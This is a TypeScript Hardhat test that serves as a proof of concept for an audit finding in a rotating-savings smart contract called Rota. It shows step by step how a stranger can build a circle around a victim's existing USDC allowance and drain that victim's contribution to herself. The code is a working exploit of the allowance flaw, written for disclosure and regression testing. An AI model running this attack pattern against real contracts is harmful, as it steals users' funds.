/*
 * Proof of concept for the finding Slither reports as `arbitrary-send-erc20`
 * (High/High) on Rota.disburse.
 *
 * A USDC allowance is granted to the Rota CONTRACT, not to a circle. Nothing
 * in createCircle asks the people it names whether they agreed to be in it,
 * and start() only checks that each member's allowance is large enough — not
 * that they meant it for this circle.
 *
 * So anyone can create a circle naming a victim who already has an allowance
 * to Rota from some other circle, put themselves first in the rotation, and
 * settle one cycle. The victim pays; the attacker receives; the attacker never
 * pays in because they simply never let a second cycle settle.
 *
 * This test asserts the CURRENT behaviour of the deployed contract. It passing
 * means the contract is still vulnerable. See contracts/audit/FINDINGS.md.
 */
import assert from "node:assert/strict";
import { describe, it } from "node:test";

import { network } from "hardhat";
import type { Address } from "viem";

const USDC_DECIMALS = 6n;
const usdc = (whole: bigint) => whole * 10n ** USDC_DECIMALS;

const { viem, networkHelpers } = await network.getOrCreate();
const { time } = networkHelpers;

const publicClient = await viem.getPublicClient();
const wallets = await viem.getWalletClients();

const [deployer, aliceW, bobW, malloryW] = wallets;
const alice = aliceW.account.address as Address;
const bob = bobW.account.address as Address;
const mallory = malloryW.account.address as Address;

describe("FINDING: an allowance granted to Rota is spendable by any circle", () => {
  it("lets a stranger create a circle and take a member's contribution", async () => {
    const token = await viem.deployContract("MockUSDC");
    const rota = await viem.deployContract("Rota", [token.address]);

    const balanceOf = (who: Address) =>
      token.read.balanceOf([who]) as Promise<bigint>;
    const mine = async (hash: `0x${string}`) =>
      publicClient.waitForTransactionReceipt({ hash });

    await token.write.mint([alice, usdc(1_000n)]);
    await token.write.mint([bob, usdc(1_000n)]);
    await token.write.mint([mallory, usdc(1_000n)]);

    // --- Alice joins a circle she actually agreed to -----------------------
    // Two members at 100 USDC, so a full rotation costs her 100.
    await mine(
      await rota.write.createCircle([[alice, bob], usdc(100n), 3600n], {
        account: aliceW.account,
      }),
    );
    await mine(
      await token.write.approve([rota.address, usdc(100n)], {
        account: aliceW.account,
      }),
    );

    const allowanceAfterJoining = (await token.read.allowance([
      alice,
      rota.address,
    ])) as bigint;
    assert.equal(allowanceAfterJoining, usdc(100n));

    // --- Mallory, a complete stranger, builds a circle around her ----------
    // Alice is never asked. Mallory is first in the rotation, so Mallory is
    // paid first and pays nothing.
    const attackId = 1n;
    await mine(
      await rota.write.createCircle([[mallory, alice], usdc(100n), 1n], {
        account: malloryW.account,
      }),
    );
    // Mallory needs an allowance too, but never has to honour it.
    await mine(
      await token.write.approve([rota.address, usdc(100n)], {
        account: malloryW.account,
      }),
    );

    // start() only asks "is the allowance big enough", never "did you agree".
    await mine(
      await rota.write.start([attackId], { account: malloryW.account }),
    );

    const aliceBefore = await balanceOf(alice);
    const malloryBefore = await balanceOf(mallory);

    await time.increase(2);
    await mine(
      await rota.write.disburse([attackId], { account: malloryW.account }),
    );

    const aliceAfter = await balanceOf(alice);
    const malloryAfter = await balanceOf(mallory);

    // The theft, stated plainly.
    assert.equal(
      aliceBefore - aliceAfter,
      usdc(100n),
      "Alice paid 100 USDC into a circle she never joined",
    );
    assert.equal(
      malloryAfter - malloryBefore,
      usdc(100n),
      "Mallory received it",
    );

    // And Alice's real circle can no longer settle: her allowance is spent.
    const left = (await token.read.allowance([alice, rota.address])) as bigint;
    assert.equal(left, 0n, "her allowance was consumed by the attacker");
  });
});
